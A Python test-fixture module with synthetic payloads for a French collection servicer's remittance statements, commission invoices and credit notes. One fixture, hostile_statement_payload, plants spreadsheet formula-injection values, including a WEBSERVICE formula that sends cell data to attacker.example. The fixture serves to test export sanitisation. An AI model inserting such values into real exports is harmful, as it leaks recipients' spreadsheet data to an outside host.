"""Synthetic payloads for the statement and invoice renderers (M2c-5), in the shape the SQL builds
them (`private.remittance_statement_build`, `private.issue_commission_documents`). Fixed values:
the golden hashes and text snapshots of tests/test_statement_docs.py depend on them."""

from __future__ import annotations

import copy
from datetime import date
from typing import Any

OFFICE = {"line1": "10 rue de la Bourse", "postcode": "75002", "city": "Paris", "country": "FR"}
SELLER: dict[str, Any] = {
    "name": "Collectoo",
    "siren": "732829320",
    "currency": "EUR",
    "rcs_city": "Paris",
    "legal_form": "SAS",
    "vat_number": "FR44732829320",
    "in_liquidation": False,
    "billing_address": OFFICE,
    "is_professional": True,
    "registered_office": OFFICE,
    "share_capital_minor": "1000000",
    "invoice_acceptance_ref": None,
    "entrepreneur_individuel": False,
}
BUYER: dict[str, Any] = {
    "name": "Martin SAS",
    "siren": "552100554",
    "currency": "EUR",
    "rcs_city": "Lyon",
    "legal_form": "SAS",
    "vat_number": None,
    "in_liquidation": False,
    "billing_address": {
        "line1": "3 quai Perrache",
        "line2": "Bât. B",
        "postcode": "69002",
        "city": "Lyon",
        "country": "FR",
    },
    "is_professional": True,
    "registered_office": {
        "line1": "3 quai Perrache",
        "postcode": "69002",
        "city": "Lyon",
        "country": "FR",
    },
    "share_capital_minor": "500000",
    "invoice_acceptance_ref": "art. 11 du mandat",
    "entrepreneur_individuel": False,
}
# the statement fixture's previous approved run (M2c-6b-2d: « Suivi »'s window starts at its K)
SINCE: dict[str, Any] = {"number": "RV-2026-000001", "known_at": "2026-10-20T15:30:00Z"}
COLUMNS = [
    "line_no", "mandate", "portfolio", "file", "debtor", "items", "components", "nature",
    "nature_reason", "from_run", "encaissement_date", "effective_date", "deadline", "amount_minor",
    "rules", "rates", "basis_minor", "commission_minor", "commission_state", "invoice", "receipt",
    "late", "late_cause", "paid_by_unplanned_minor", "paid_by_unplanned_on",
]  # fmt: skip


def _line(  # noqa: PLR0913, PLR0917 - a fixture row
    no: int,
    file: str | None,
    debtor: str | None,
    kind: str,
    amount: int,
    commission: int,
    **kw: Any,
) -> list[Any]:
    v: dict[str, Any] = {
        "line_no": no,
        "mandate": "MAND-MARTIN-2026",
        "portfolio": "Factures B2B",
        "file": file,
        "debtor": debtor,
        "items": [["invoice", f"F-{no:03d}"]],
        "components": ["principal"],
        "nature": kind,
        "nature_reason": None,
        "from_run": None,
        "encaissement_date": "2026-10-21",
        "effective_date": "2026-10-21",
        "deadline": "2026-11-20",
        "amount_minor": str(amount),
        "rules": ["Factures entre professionnels"],
        "rates": ["0.15"],
        "basis_minor": str(amount),
        "commission_minor": str(commission),
        "commission_state": "charged",
        "invoice": "FC-2026-000003",
        "receipt": f"Q-2026-{no:06d}",
        "late": False,
        "late_cause": None,
        "paid_by_unplanned_minor": None,
        "paid_by_unplanned_on": None,
    }
    v.update(kw)
    return [v[c] for c in COLUMNS]


def statement_payload() -> dict[str, Any]:
    """RV-2026-000002 of Martin SAS: three files, a bank return credited on the invoice that
    charged it, a forward of a recalled file, a collection whose commission an earlier run left
    pending, a late line; an invoice and a credit note netted, an earlier invoice set off; the
    previous payout debited; money held and refunded on the files."""
    lines = [
        _line(
            1,
            "L-001",
            "Durand SARL",
            "allocation",
            200_000,
            30_000,
            components=["principal", "accrued_interest"],
            items=[["invoice", "F-001"], ["invoice", "F-002"]],
        ),
        _line(
            2,
            "L-002",
            "Petit & Fils",
            "allocation",
            50_000,
            7_500,
            late=True,
            late_cause="approved_late",
            encaissement_date="2026-09-30",
            effective_date="2026-09-30",
            deadline="2026-10-30",
        ),
        _line(
            3,
            "L-001",
            "Durand SARL",
            "allocation_reversal",
            -20_000,
            -3_000,
            nature_reason="bank_return",
            encaissement_date="2026-10-02",
            effective_date="2026-10-28",
            invoice="FC-2026-000004",
        ),
        _line(
            4,
            "L-003",
            "Société Nouvelle d'Équipement",
            "forward",
            12_345,
            0,
            nature_reason="file_recalled",
            items=[],
            components=[],
            rules=[],
            rates=[],
            basis_minor="0",
            commission_state="none",
            invoice=None,
        ),
        _line(
            5,
            "L-003",
            "Société Nouvelle d'Équipement",
            "allocation",
            1_000,
            0,
            commission_state="pending",
            rules=[],
            rates=[],
            basis_minor="0",
            invoice=None,
        ),
        _line(
            9,
            "L-002",
            "Petit & Fils",
            "allocation",
            0,
            1_200,
            from_run="RV-2026-000001",
            encaissement_date="2026-10-01",
            effective_date="2026-10-01",
            deadline="2026-10-31",
        ),
    ]
    return {
        "schema": 1,
        "number": "RV-2026-000002",
        "issue_date": "2026-11-02",
        "known_at": "2026-11-02T04:47:00Z",
        "currency": "EUR",
        "exponent": 2,
        "status": "approved",
        "cancelled_on": None,
        "settled_on": None,
        "issuer": copy.deepcopy(SELLER),
        "client": copy.deepcopy(BUYER),
        "mandates": [
            {
                "reference": "MAND-MARTIN-2026",
                "signed_on": "2026-01-15",
                "commission_clause_ref": "art. 6",
                "remittance_clause_ref": "art. 7",
                "netting_clause_ref": "art. 7.2",
                "clawback_clause_ref": "art. 7.4",
            }
        ],
        "service_period": {"from": "2026-10-21", "to": "2026-11-02"},
        "totals": {
            "line_count": 5,
            "repriced_count": 1,
            "file_count": 3,
            "repriced_only_file_count": 0,
            "collected_minor": "263345",
            "reversed_minor": "-20000",
            "commission_ht_minor": "35700",
            "late_count": 1,
            "gross_minor": "243345",
            "invoice_ht_minor": "38700",
            "invoice_vat_minor": "7740",
            "invoice_ttc_minor": "46440",
            "credit_ht_minor": "3000",
            "credit_vat_minor": "600",
            "credit_ttc_minor": "3600",
            "commission_taken_minor": "56840",
            "advance_recovered_minor": "0",
            "refund_minor": "0",
            "settlement_minor": "56840",
            "net_minor": "186505",
        },
        "files": [
            {
                "file": "L-001",
                "debtor": "Durand SARL",
                "lines": "2",
                "amount_minor": "180000",
                "commission_minor": "27000",
                "late": "0",
            },
            {
                "file": "L-002",
                "debtor": "Petit & Fils",
                "lines": "1",
                "amount_minor": "50000",
                "commission_minor": "8700",
                "late": "1",
            },
            {
                "file": "L-003",
                "debtor": "Société Nouvelle d'Équipement",
                "lines": "2",
                "amount_minor": "13345",
                "commission_minor": "0",
                "late": "0",
            },
        ],
        "natures": [
            {
                "kind": "allocation",
                "reason": None,
                "count": "3",
                "amount_minor": "251000",
                "commission_minor": "37500",
            },
            {
                "kind": "allocation_reversal",
                "reason": "bank_return",
                "count": "1",
                "amount_minor": "-20000",
                "commission_minor": "-3000",
            },
            {
                "kind": "forward",
                "reason": "file_recalled",
                "count": "1",
                "amount_minor": "12345",
                "commission_minor": "0",
            },
            {
                "kind": "repricing",
                "reason": None,
                "count": "1",
                "amount_minor": "0",
                "commission_minor": "1200",
            },
        ],
        "line_columns": list(COLUMNS),
        "lines": lines,
        "documents": [
            {
                "id": "d0000000-0000-0000-0000-000000000003",
                "kind": "invoice",
                "number": "FC-2026-000003",
                "issue_date": "2026-11-02",
                "reason": "commission",
                "mandate": "MAND-MARTIN-2026",
                "ht_minor": "38700",
                "vat_minor": "7740",
                "ttc_minor": "46440",
                "vat_rate": "0.2000",
                "settlement": "netted",
                "due_date": None,
                "clause_ref": "art. 7.2",
                "payment_reference": {
                    "mode": "run",
                    "run_number": "RV-2026-000002",
                    "execution_date": "2026-11-03",
                    "transfer": True,
                    "amount_minor": "46440",
                },
                "own_account": None,
                "corrects": [],
                "cancelled_by": [],
                "settles_minor": "46440",
            },
            {
                "id": "d0000000-0000-0000-0000-000000000004",
                "kind": "credit_note",
                "number": "FC-2026-000004",
                "issue_date": "2026-11-02",
                "reason": "commission",
                "mandate": "MAND-MARTIN-2026",
                "ht_minor": "-3000",
                "vat_minor": "-600",
                "ttc_minor": "-3600",
                "vat_rate": None,
                "settlement": "netted",
                "due_date": None,
                "clause_ref": "art. 7.2",
                "payment_reference": {
                    "mode": "run",
                    "run_number": "RV-2026-000002",
                    "execution_date": "2026-11-03",
                    "transfer": True,
                    "amount_minor": "0",
                },
                "own_account": None,
                "cancelled_by": [],
                "corrects": [
                    {
                        "number": "FC-2026-000001",
                        "issue_date": "2026-10-20",
                        "ht_minor": "-3000",
                        "vat_minor": "-600",
                    }
                ],
                "settles_minor": "0",
            },
        ],
        "earlier_settled": [
            {
                "kind": "compensation",
                "document_kind": "invoice",
                "number": "FC-2026-000001",
                "issue_date": "2026-10-20",
                "amount_minor": "10400",
            },
        ],
        "payout": {
            "amount_minor": "186505",
            "ordered_on": "2026-11-02",
            "requested_execution_date": "2026-11-03",
            "iban": "FR76 •••• •••• •••• 1234",
            "holder": "MARTIN SAS",
            "end_to_end_id": "RMT0A1B2C3D4E5F",
            "status": "ordered",
        },
        "requested_execution_date": "2026-11-03",
        # M2c-6b-2d (template fr-3): what became of the earlier runs' payouts in the window from
        # the previous approved run's K to this K (plan §5)
        "previous_payouts": {
            "since": dict(SINCE),
            "events": [
                {
                    "kind": "debited",
                    "run_number": "RV-2026-000001",
                    "amount_minor": "100000",
                    "end_to_end_id": "RMT0Z9Y8X7W6V5U",
                    "on": "2026-10-21",
                },
            ],
        },
        "not_remitted": {
            "held": [
                {
                    "file": "L-002",
                    "reason": "hold_blocks_allocation",
                    "currency": "EUR",
                    "amount_minor": "15000",
                    "first_date": "2026-10-12",
                    "last_date": "2026-10-19",
                    "count": "2",
                },
            ],
            "refunded": [
                {
                    "file": "L-009",
                    "reason": "overpayment",
                    "currency": "EUR",
                    "amount_minor": "8000",
                    "first_date": "2026-10-21",
                    "last_date": "2026-10-21",
                    "count": "1",
                },
            ],
        },
        "position": {
            "owed_before_minor": "243345",
            "owed_after_minor": "0",
            "receivable_before_minor": "14000",
            "receivable_after_minor": "0",
            "advances_before_minor": "0",
            "advances_after_minor": "0",
        },
    }


INVOICE_LINES = [
    {
        "kind": "commission",
        "designation_fr": (
            "Commission de recouvrement amiable — Factures entre professionnels — 15\u00a0% sur "
            "2\u202f500,00\u00a0€ encaissés du 21/10/2026 au 02/11/2026 (mandat MAND-MARTIN-2026, "
            "relevé RV-2026-000002)"
        ),
        "claim_type": "b2b_invoice",
        "rule_id": "b2b",
        "families": ["principal", "interest"],
        "tiers": [["0.15", "250000"]],
        "ht": "37500",
        "vat_rate": "0.2000",
    },
    {
        "kind": "regularisation",
        "designation_fr": (
            "Régularisation de paliers (changement de conditions) — encaissements du 21/10/2026 au "
            "02/11/2026 (mandat MAND-MARTIN-2026, relevé RV-2026-000002)"
        ),
        "claim_type": "b2b_invoice",
        "rule_id": "b2b",
        "families": ["principal"],
        "tiers": [],
        "ht": "1200",
        "vat_rate": "0.2000",
    },
]


def invoice_payload(**over: Any) -> dict[str, Any]:
    """FC-2026-000003, netted on RV-2026-000002."""
    p: dict[str, Any] = {
        "kind": "invoice",
        "number": "FC-2026-000003",
        "issue_date": "2026-11-02",
        "seller": copy.deepcopy(SELLER),
        "buyer": copy.deepcopy(BUYER),
        "mandate": {"id": "70000000-0000-0000-0000-000000000001", "reference": "MAND-MARTIN-2026"},
        "run": {"id": "80000000-0000-0000-0000-000000000002", "number": "RV-2026-000002"},
        "service_period": {"from": "2026-10-21", "to": "2026-11-02"},
        "lines": copy.deepcopy(INVOICE_LINES),
        "corrections": [],
        "totals": {
            "ht_minor": "38700",
            "vat_minor": "7740",
            "ttc_minor": "46440",
            "vat_rate": "0.2000",
            "currency": "EUR",
        },
        "settlement": {"mode": "netted", "clause_ref": "art. 7.2", "due_days": None},
        "due_date": None,
        "payment_reference": {
            "mode": "run",
            "run_number": "RV-2026-000002",
            "execution_date": "2026-11-03",
            "transfer": True,
            "amount_minor": "46440",
        },
        "own_account": None,
        "penalty_text": (
            "Pénalités de retard : taux d'intérêt appliqué par la Banque centrale européenne à son "
            "opération de refinancement la plus récente, majoré de 10 points de pourcentage."
        ),
        "flat_indemnity": {"applies": True, "amount_minor": "4000", "proceeding": None},
        "vat_on_debits": False,
        "reason": "commission",
    }
    p.update(over)
    return p


def due_invoice_payload() -> dict[str, Any]:
    """Without a netting clause: due within 30 days to the own account, frozen at issue."""
    return invoice_payload(
        number="FC-2026-000005",
        settlement={"mode": "due", "clause_ref": None, "due_days": 30},
        due_date="2026-12-02",
        payment_reference=None,
        own_account={
            "iban": "FR7630006000011234567890189",
            "bic": "AGRIFRPPXXX",
            "holder": "Collectoo",
        },
    )


def credit_note_payload() -> dict[str, Any]:
    return invoice_payload(
        kind="credit_note",
        number="FC-2026-000004",
        lines=[
            {
                "kind": "credit",
                "designation_fr": (
                    "Avoir rectifiant la facture FC-2026-000001 du 20/10/2026 — encaissements "
                    "annulés (relevé RV-2026-000002)"
                ),
                "ht": "-3000",
                "vat_rate": "0.2000",
                "original_invoice_id": "c0000000-0000-0000-0000-000000000001",
            }
        ],
        corrections=[
            {
                "original_invoice_id": "c0000000-0000-0000-0000-000000000001",
                "vat_rate": "0.2000",
                "ht": "-3000",
                "vat": "-600",
                # FC-1 (100,00 € HT, 20,00 € VAT) once this note is applied (review legal#1)
                "ht_after": "7000",
                "vat_after": "1400",
            },
        ],
        totals={
            "ht_minor": "-3000",
            "vat_minor": "-600",
            "ttc_minor": "-3600",
            "vat_rate": None,
            "currency": "EUR",
        },
        flat_indemnity={"applies": True, "amount_minor": "4000"},
    )


CREDIT_REFS = {
    "c0000000-0000-0000-0000-000000000001": {"number": "FC-2026-000001", "issue_date": "2026-10-20"}
}
ISSUE = date(2026, 11, 2)


# -- review fixes (M2c-5 review) -----------------------------------------------------------------


def hostile_statement_payload() -> dict[str, Any]:
    """Boarded text a spreadsheet would run as a formula (review security#0): a debtor, a file
    reference, a mandate and a portfolio starting with = @ + -, a tab and a carriage return."""
    p = statement_payload()
    cols = {name: i for i, name in enumerate(COLUMNS)}
    first = p["lines"][0]
    first[cols["debtor"]] = '=WEBSERVICE("https://attacker.example/?"&B2)'
    first[cols["file"]] = "@SUM(1+1)"
    first[cols["mandate"]] = "+1+cmd"
    first[cols["portfolio"]] = "-2+3"
    second = p["lines"][1]
    second[cols["debtor"]] = "\tTAB SARL"
    second[cols["file"]] = "\rCR-1"
    return p


def partial_invoice_payload() -> dict[str, Any]:
    """FC-2026-000003 of which the plan sets off 200,00 € on RV-2026-000002 (older invoices taken
    first): the remainder on the next run by its latest date (review legal#4)."""
    return invoice_payload(
        due_date="2026-12-02",
        payment_reference={
            "mode": "run",
            "run_number": "RV-2026-000002",
            "execution_date": "2026-11-03",
            "transfer": True,
            "amount_minor": "20000",
            "remainder_minor": "26440",
            "latest_date": "2026-12-02",
        },
    )


def partial_statement_payload() -> dict[str, Any]:
    p = statement_payload()
    doc = p["documents"][0]
    doc["settles_minor"] = "20000"
    doc["due_date"] = "2026-12-02"
    doc["payment_reference"] = copy.deepcopy(partial_invoice_payload()["payment_reference"])
    return p


def zero_net_invoice_payload() -> dict[str, Any]:
    """A run that transfers nothing (N = 0): its plan posted at approval (review legal#5)."""
    return invoice_payload(
        payment_reference={
            "mode": "run",
            "run_number": "RV-2026-000002",
            "execution_date": "2026-11-02",
            "transfer": False,
            "amount_minor": "46440",
        },
    )


def zero_net_statement_payload() -> dict[str, Any]:
    p = statement_payload()
    p["status"], p["settled_on"], p["payout"], p["requested_execution_date"] = (
        "booked",
        "2026-11-02",
        None,
        None,
    )
    p["totals"]["net_minor"] = "0"
    p["documents"][0]["payment_reference"] = copy.deepcopy(
        zero_net_invoice_payload()["payment_reference"]
    )
    return p


def cancelled_statement_payload() -> dict[str, Any]:
    """RV-2026-000002 cancelled before its statement was drawn (review legal#2, figures#0): its
    invoice annulled by the cancellation's credit note, nothing set off, the gross still owed."""
    p = statement_payload()
    p["status"], p["cancelled_on"] = "cancelled", "2026-11-03"
    p["payout"]["status"] = "cancelled"
    for d in p["documents"]:
        d["settles_minor"] = "0"
    p["documents"][0]["cancelled_by"] = [{"number": "FC-2026-000005", "issue_date": "2026-11-03"}]
    p["documents"].append(
        {
            "id": "d0000000-0000-0000-0000-000000000005",
            "kind": "credit_note",
            "number": "FC-2026-000005",
            "issue_date": "2026-11-03",
            "reason": "run_cancelled",
            "mandate": "MAND-MARTIN-2026",
            "ht_minor": "-38700",
            "vat_minor": "-7740",
            "ttc_minor": "-46440",
            "vat_rate": None,
            "settlement": "netted",
            "due_date": None,
            "clause_ref": None,
            "payment_reference": None,
            "own_account": None,
            "corrects": [
                {
                    "number": "FC-2026-000003",
                    "issue_date": "2026-11-02",
                    "ht_minor": "-38700",
                    "vat_minor": "-7740",
                }
            ],
            "cancelled_by": [],
            "settles_minor": "0",
        }
    )
    p["earlier_settled"] = []
    p["position"].update(
        owed_after_minor=p["position"]["owed_before_minor"], receivable_after_minor="10400"
    )
    return p


def proceeding_invoice_payload() -> dict[str, Any]:
    """A professional buyer with a proceeding recorded before the issue: the 40 € is still stated
    (L441-9 I; review legal#0), the proceeding kept for the dunning step."""
    return invoice_payload(
        number="FC-2026-000006",
        flat_indemnity={
            "applies": True,
            "amount_minor": "4000",
            "proceeding": {"kind": "proceeding_opened", "effective_date": "2026-10-01"},
        },
    )


def _event(kind: str, **kw: Any) -> dict[str, Any]:
    return {"kind": kind, **kw}


# M2c-6b-2d: one event of each kind « Suivi » words (plan §5), in the order the SQL sorts them (its
# date, then the run number): the shapes private.remittance_statement_previous_payouts returns
SUIVI_EVENTS: list[dict[str, Any]] = [
    _event(
        "debited",
        run_number="RV-2026-000001",
        amount_minor="164000",
        end_to_end_id="RMT0A1B2C3D4E5F",
        on="2026-11-03",
    ),
    _event("cancelled", run_number="RV-2026-000004", on="2026-11-03"),
    _event(
        "returned",
        run_number="RV-2026-000001",
        amount_minor="164000",
        end_to_end_id="RMT0A1B2C3D4E5F",
        debited_on="2026-11-03",
        on="2026-11-05",
        repaid="here",
        repaid_by=None,
    ),
    _event(
        "executed_after_cancellation",
        run_number="RV-2026-000005",
        cancelled_on="2026-11-03",
        unplanned_minor="164000",
        advance_minor="44000",
        p_bound="queue",
        execution_no=1,
        on="2026-11-05",
        here=True,
    ),
    _event(
        "debited_again",
        run_number="RV-2026-000006",
        unplanned_minor="164000",
        advance_minor="164000",
        p_bound="none",
        execution_no=2,
        debited_on="2026-11-03",
        before_debit=False,
        on="2026-11-05",
        here=True,
    ),
    # review round 1 (legal-texts-1, statement-money): a later execution of each, and one the bank
    # made before the planned debit but booked after it
    _event(
        "executed_after_cancellation",
        run_number="RV-2026-000005",
        cancelled_on="2026-11-03",
        unplanned_minor="164000",
        advance_minor="164000",
        p_bound="queue",
        execution_no=2,
        on="2026-11-06",
        here=True,
    ),
    _event(
        "debited_again",
        run_number="RV-2026-000006",
        unplanned_minor="164000",
        advance_minor="164000",
        p_bound="none",
        execution_no=3,
        debited_on="2026-11-03",
        before_debit=False,
        on="2026-11-06",
        here=True,
    ),
    _event(
        "debited_again",
        run_number="RV-2026-000007",
        unplanned_minor="82000",
        advance_minor="82000",
        p_bound="none",
        execution_no=1,
        debited_on="2026-11-09",
        before_debit=True,
        on="2026-11-06",
        here=True,
    ),
    _event(
        "executed_outside",
        run_number=None,
        amount_minor="164000",
        advance_minor="164000",
        iban_last4="4350",
        on="2026-11-06",
        here=True,
    ),
    _event(
        "unplanned_returned",
        run_number="RV-2026-000005",
        unplanned_minor="164000",
        advance_minor="44000",
        owed_minor="120000",
        executed_on="2026-11-05",
        on="2026-11-10",
        here=True,
    ),
]


def suivi_statement_payload() -> dict[str, Any]:
    """The statement fixture with one « Suivi » event of each kind (M2c-6b-2d, template fr-3): its
    golden PDF pins every sentence's bytes."""
    p = statement_payload()
    p["previous_payouts"] = {"since": dict(SINCE), "events": copy.deepcopy(SUIVI_EVENTS)}
    return p


# -- M2c-7d-3: the statement fr-4 (plan §6.2.8; template `releve-reversement-fr-4`) ----------------


def fr4_statement_payload() -> dict[str, Any]:
    """RV-2026-000002 drawn under fr-4 (schema 2), for the end of the mandate: the client, Jean
    Martin (an entrepreneur individuel), died on 25/10/2026; the servicer recorded it on 30/10/2026
    (C. civ. 2008: the end and the day it was known, [critic] L13), before the run's K. As the
    code applies it (review round 1, TUI-3): the collections are all before the death (under the
    mandate, commission charged); from the recording nothing is set off — the run's invoice is due
    by its term to the servicer's own account, FC-2026-000001 stays owed (the position), the payout
    is the gross, to the estate's account; the statement is addressed to the notary (the role only:
    the name and address stay staff's, [critic] L12)."""
    p = statement_payload()
    p["schema"] = 2
    p["client"] = {
        **p["client"],
        "name": "Jean Martin",
        "legal_form": "EI",
        "share_capital_minor": None,
        "entrepreneur_individuel": True,
    }
    p["mandate_end"] = {
        "kind": "death",
        "effective_date": "2026-10-25",
        "recorded_on": "2026-10-30",
        "payee_kind": "estate",
    }
    p["addressees"] = [{"role": "notary", "copy": False}]
    invoice = p["documents"][0]
    invoice.update(
        settlement="due",
        due_date="2026-12-02",
        payment_reference=None,
        own_account={
            "iban": "FR7610107001011234567890129",
            "bic": "TESTFRPPXXX",
            "holder": "Collectoo",
        },
        settles_minor="0",
    )
    p["earlier_settled"] = []
    p["totals"].update(commission_taken_minor="0", settlement_minor="0", net_minor="243345")
    p["payout"].update(
        amount_minor="243345", iban="FR76 •••• •••• •••• 5678", holder="SCP LENOIR NOTAIRES"
    )
    p["position"].update(receivable_after_minor="56840")
    return p


def fr4_withheld_payload() -> dict[str, Any]:
    """RV-2026-000002 drawn under fr-4 (schema 2), for what fr-3 cannot word besides the end
    (review round 1, TUI-3: apart from the death's fixture, consistent): a seizure in the
    servicer's hands, recorded after RV-2026-000001's file was downloaded, made its debit
    (28/10/2026) withhold the set-off of 200,00 € of FC-2026-000001 ([critic] M7-MONEY-5); the
    seizure released before this run's K, the run gives the 200,00 € back (a line of its own,
    « Hors dossier ») and sets FC-2026-000001 off again with the rest, and takes back an advance,
    dated (§1.2) — each in the totals, the position and the payout."""
    p = statement_payload()
    p["schema"] = 2
    p["lines"] = [
        *p["lines"],
        _line(
            10,
            None,
            None,
            "settlement_withheld",
            20_000,
            0,
            items=[],
            components=[],
            mandate=None,
            portfolio=None,
            rules=[],
            rates=[],
            basis_minor="0",
            commission_state="none",
            invoice=None,
            receipt=None,
            encaissement_date="2026-10-28",
            effective_date="2026-10-28",
            deadline="2026-11-27",
        ),
    ]
    p["withheld_given_back"] = [
        {
            "run_number": "RV-2026-000001",
            "amount_minor": "20000",
            "withheld_on": "2026-10-28",
            "reason": (
                "Compensation retenue : saisie entre les mains du cabinet depuis le 27/10/2026 "
                "(règle du cabinet)"
            ),
        }
    ]
    p["earlier_settled"] = [
        {**p["earlier_settled"][0], "amount_minor": "30400"},
        {
            "kind": "advance",
            "document_kind": "advance",
            "amount_minor": "15000",
            "born_on": "2026-10-09",
        },
    ]
    p["totals"].update(
        line_count=6,
        collected_minor="283345",
        gross_minor="263345",
        commission_taken_minor="76840",
        advance_recovered_minor="15000",
        settlement_minor="91840",
        net_minor="171505",
    )
    p["natures"] = [
        *p["natures"],
        {
            "kind": "settlement_withheld",
            "reason": None,
            "count": "1",
            "amount_minor": "20000",
            "commission_minor": "0",
        },
    ]
    p["files"] = [
        *p["files"],
        {
            "file": None,
            "debtor": None,
            "lines": "1",
            "amount_minor": "20000",
            "commission_minor": "0",
            "late": "0",
        },
    ]
    p["payout"]["amount_minor"] = "171505"
    p["previous_payouts"]["events"][0]["on"] = "2026-10-28"
    p["position"].update(
        owed_before_minor="263345", receivable_before_minor="34000", advances_before_minor="15000"
    )
    return p


def fr4_curatorship_payload() -> dict[str, Any]:
    """A curatelle (no end of the mandate: C. civ. 2003 names « la tutelle des majeurs » only):
    the statement goes to the client, its curator in copy (our rule by analogy with 467 al. 3,
    OQ-94)."""
    p = statement_payload()
    p["schema"] = 2
    p["addressees"] = [{"role": "client", "copy": False}, {"role": "curator", "copy": True}]
    return p
